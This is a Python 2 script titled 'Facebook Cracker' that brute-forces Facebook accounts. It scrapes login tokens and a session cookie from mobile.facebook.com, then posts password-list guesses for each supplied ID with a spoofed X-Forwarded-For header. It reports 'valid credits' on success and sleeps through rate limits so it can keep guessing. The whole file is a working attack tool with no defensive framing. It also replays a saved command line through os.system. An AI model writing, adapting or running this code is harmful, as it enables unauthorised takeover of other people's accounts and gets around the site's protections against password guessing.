import requests,os,sys,urllib,time
requests.packages.urllib3.disable_warnings()

os.system('clear')
print '''
===============================================
=============Facebook Cracker==================
===================By YaserGersy 2016==========
===============================================



'''

class stx:    
	RED='\033[1;31m'
	brown='\033[0;33m'
	Blue='\033[0;34m'
	Green='\033[1;32m'    
	FAIL = '\033[91m'
	ENDC = '\033[0m'
	yel = '\033[93m'
	White='\033[1;37m'
	crims=' \033[1;38m'
	magenta='\033[1;35m'
	CURSOR_UP_ONE = '\x1b[1A'
	ERASE_LINE = '\x1b[2K'
	me='FbCracker.py'									
	lin='\n---------------------------------------------------------------------------------\n'
	prxs = { "http"  : "http://127.0.0.1:8080", "https" : "https://127.0.0.1:8080",   "ftp"   : "ftp://127.0.0.1:8080"}
	slp=1
class Request1:
	url=''
	headers={}
	req=''
	sucs=False
	li=''
	lsd=''
	m_ts=''
	datr=''
	rety=False
	def __init__(self,u):
		self.url=u


def getCookie(req,cokname):
	try:
		cokz=req.headers['Set-Cookie']
		v=cokz.split(cokname+'=')
		v2=v[1].split(';')
		d=v2[0]
		return d
	except Exception,e:
		d='0'
	return d
def isTenz(i):
	# 10  100 1000
	res = i/10
	if res==1:
		return True
	if res < 1:
		return False
	sres=str(res)
	if len(sres)<1:
		return False 
	if sres[0]!='1':
		return False
	index=-1
	for char in sres:
		index=index+1
		if index==0:
			if char=='1' or char==1:
				continue
			else:
				return False
		if char!='0':
			return False
	return False
def sleeper(time_,msg,display):
	lastlen=0
	if msg=='' and display is False:
		time.sleep(time_)
	else:
		sys.stdout.write(stx.magenta+msg)
		sys.stdout.flush()
		adit=''
		for i in xrange(time_,0,-1):
			sys.stdout.write(str(i)+adit)  #10
			sys.stdout.flush()
			time.sleep(1)
			lastlen=len(str(i))
			if isTenz(i):
				adit=' \b'
			else:
				adit=''
			for i in range(0,lastlen):
				sys.stdout.write('\b')
				sys.stdout.flush()
		print('\r'+(' '*(len(msg)+1)))
def getPar(tex,parname):
	xx = tex.split('name="'+parname+'" value="')
	xz = xx[1].split('"')	
	return xz[0]
def leaveusage():
	print '[+] Usage \n 	python '+stx.me+' ids.txt password.txt'
	exit()
def leavPasswordListNotFound(p):
	print(stx.RED+'File not found ['+p+'] '+stx.Green)
	exit()
def leavPasswordListEmpty():
	print(stx.RED+' Empty password lists')
	exit()
def listtostr(l):
	x=''
	for m in l :
		x =x+m+','
	x=x[0:len(x)-2]
def load():
	global idlist,paswordlist,ipath,ppath,startindex
	idlist=[]
	paswordlist=[]
	ipath=''
	ppath=''
	startindex=0
	if len(sys.argv) < 2:
		leaveusage()
	elif sys.argv[1]=='last':
		with open(curentDir()+'last.cmd') as v:
			ex=v.readlines()
			if len(ex[0]) > 0:
				os.chdir(ex[0].strip())
				os.system(ex[1])
		exit()
	else:
		ipath=sys.argv[1]
		if os.path.isfile(ipath):
			with open(ipath) as strm:
				lines=strm.readlines()
				for lx in lines:
					l=lx.strip()
					if l in  idlist:
						continue
					elif len (l)> 2:
						idlist.append(l.strip())
		else :
			v=sys.argv[1]
			v=v+','
			vx = v.split(',')
			for b in vx :
				if b in idlist:
					continue
				elif len(b) > 1:
					idlist.append(b)
				elif len(sys.argv[1]) > 1:
					idlist.append(sys.argv[1])

		if len(sys.argv) > 2:
			ppath=sys.argv[2]
		else:
			ppath='passwordlist.txt'

	passPaths=[]
	if ',' in ppath:
		passPaths=ppath.split(',')
	else:
		passPaths=[ppath]
	notfound=True
	for pypath in passPaths:
		notfound=False
		if os.path.isfile(pypath):
			with open(pypath) as strm2 :
				lines=strm2.readlines()
				for _pasword_ in lines:
					p=_pasword_.strip()
					if p in paswordlist:
						continue
					elif len(p) > 5:
						paswordlist.append(p)
	if notfound:
			leavPasswordListNotFound(ppath)
	elif len(paswordlist) < 1:
		leavPasswordListEmpty()

	if len(sys.argv) >3:
		startindex=sys.argv[3]
		try:
			startindex=int(startindex)
		except Exception,e:
			startindex=0
def curentDir():
	lp=''
	if '/' in sys.argv[0]:
		sp = sys.argv[0].split('/')
		for k in range(0,len(sp)-1):
			lp= sp[k]+'/'
	return lp
def spaces(i):
	l=5-len(str(i))
	z=''
	for i in range(0,l):
		z=z+'.'
	return ''+z.replace('.',' ')+''
def info ():
	global idlist,paswordlist,ipath,ppath,startindex
	ids=str(len(idlist))+", "
	if len(idlist) < 6:
		ids=''
		for i in idlist:
			ids = ids+i +', '
		if ',' in ipath:
			ids ='     ['+stx.Green+ids
		elif len(idlist) >1 :
			ids ='From ['+ipath+']  ['+stx.Green+ids 
		else :	
			ids="     ["+stx.Green+listtostr(idlist)+stx.yel+", "
	
	try:
		print stx.yel+'Ids       loaded '+ids[0:len(ids)-2]+stx.yel+"]"
		print         'Passwords loaded From ['+stx.Green+ppath+stx.yel+'] ['+stx.Green+str(len(paswordlist))+stx.yel+"]"
		print 'Starting From '+str(startindex)+stx.lin
	except Exception:
		print('error with the file paths')
def printb(x,b):
	if b:
		print(x)
def savelastcommand():
	if sys.argv[1]!='last':
		res =''
		for i in sys.argv:
			res = res +' '+i
		lp=curentDir()+'last.cmd'
		strm=open(lp,'w')
		pwd=os.getcwd()
		strm.write(pwd+'\npython '+res+'\n')
		strm.close()

def gettokens(b):
#	b=True
	result=Request1('https://mobile.facebook.com/')
	result.url='https://mobile.facebook.com/'
	result.Reqheaders={"X-Forwarded-For":"45.67.43.12","User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:48.0) Gecko/20100101 Firefox/48.0","Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Accept-Language": "en-US,en;q=0.5","Upgrade-Insecure-Requests": "1"}
	result.sucs=False	
	printb('Requesting Tokens ...',b)
	result.req=requests.get(url=result.url,headers=result.headers)
	result.li=''
	result.lsd=''
	result.m_ts=''
	result.datr=''

	if result.req.status_code==200:
		if 'name="li" value="' in result.req.text:
			result.li=getPar(result.req.text,'li')		
			printb('  [+}Success    Token[li]      ='+result.li,b)
	
			result.lsd=getPar(result.req.text,'lsd')
			printb('                Token[lsd]     ='+result.lsd,b)

			result.m_ts=getPar(result.req.text,'m_ts')
			printb('                Token[m_ts]    ='+result.m_ts,b)

			result.datr=getCookie(result.req,'datr')
			printb('                Session[datr]  ='+result.datr,b)
			load1=(result.req.status_code!=200)
			result.sucs=True
			result.rety=False
	return result


def execmain ():
	global idlist,paswordlist,startindex
	print(stx.yel)
	while startindex >= len(paswordlist):
		print('Invalid entry for start index (0,'+str(len(paswordlist)-1)+')')
		try:
			startindex=input(': ')
		except Exception,e:
			startindex=100000000000
	i=0
	obj=gettokens(True)
	savelastcommand()
	for ix in range(startindex,len(idlist)):
		i=i+1
		p=0
		_id_=idlist[ix]
		while  obj.sucs==False:
			obj=gettokens(False)
			if obj.sucs ==False:
				sleeper(2,'',True)
		iddone=False
		print stx.Blue+'------------------------Trying['+str(i)+'] ('+_id_+')------------------------\n'
		for pas in paswordlist:
			if iddone:
				break
			pasdone=False
			p=p+1
			i2="["+str(i)+"] ["+str(p)+"]  "
		
			while  pasdone==False:
				if obj.rety:
					obj=gettokens(False)
					
				pasdone=True
				_pas_=urllib.quote(pas)
				url2='https://mobile.facebook.com/login.php?refsrc=https%3A%2F%2Fmobile.facebook.com%2F&lwv=100&login_try_number=1&refid=8'
				h2={"X-Forwarded-For":"45.67.43.12","User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:48.0) Gecko/20100101 Firefox/48.0","Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Accept-Language": "en-US,en;q=0.5","Referer":"https://mobile.facebook.com/","Cookie":"datr="+obj.datr+"; reg_fb_ref=https%3A%2F%2Fmobile.facebook.com%2F; reg_fb_gate=https%3A%2F%2Fmobile.facebook.com%2F; m_ts="+obj.m_ts,"Upgrade-Insecure-Requests": "1","Content-Type":"application/x-www-form-urlencoded"}
				data2='lsd='+obj.lsd+'&charset_test=%E2%82%AC%2C%C2%B4%2C%E2%82%AC%2C%C2%B4%2C%E6%B0%B4%2C%D0%94%2C%D0%84&version=1&ajax=0&width=0&pxr=0&gps=0&dimensions=0&m_ts='+obj.m_ts+'&li='+obj.li+'&email='+_id_+'&pass='+_pas_+'&login=Log+In'
				r2=requests.post(url=url2,data=data2,headers=h2,allow_redirects=False)#,proxies=stx.prxs)
				redir=''
				try:
					redir=r2.headers['Location']
				except Exception,e:
					redir=str(r2.status_code)
				sfau=getCookie(r2,'sfau')
				xs=getCookie(r2,'xs')
				i2=stx.yel+i2+stx.Blue
				sz=spaces(p)

				if r2.status_code==302 and sfau=='0' and xs == '0':
					pasdone=True
					print(i2+stx.FAIL+' 	 Invalid  Id >  '+_id_)
					iddone=True
					break

				elif redir.startswith('https://mobile.facebook.com/home.php') or redir.startswith('https://mobile.facebook.com/login/save-device/') :
					print(i2+stx.Green+"  	Valid   credits [ '"+_id_+"' : '"+_pas_+"'  ]")
					pasdone=True
					iddone=True
					break
				elif 'You are trying too often' in r2.text:
					print(i2+stx.RED+sz+"  Rate Limit reached  [ '"+_id_+"' : '"+_pas_+"'  ]")
					sleeper(20,'Retrying in ',True)
					obj.rety=True
					pasdone=False
				elif redir.startswith('https://mobile.facebook.com/login/?'):
					print(i2+stx.magenta+sz+"  inValid credits [ '"+_id_+"' : '"+_pas_+"'  ]")

				
				else :
					print i2+stx.Blue+i2+redir,r2.status_code
					sleeper(2,'',False)
					obj.rety=True
					pasdone=False
					iddone=True
				sleeper(1,'',False)
			if pasdone:
				continue




if __name__=='__main__':
#	os.system('clear')
	load()
	info()
	execmain()

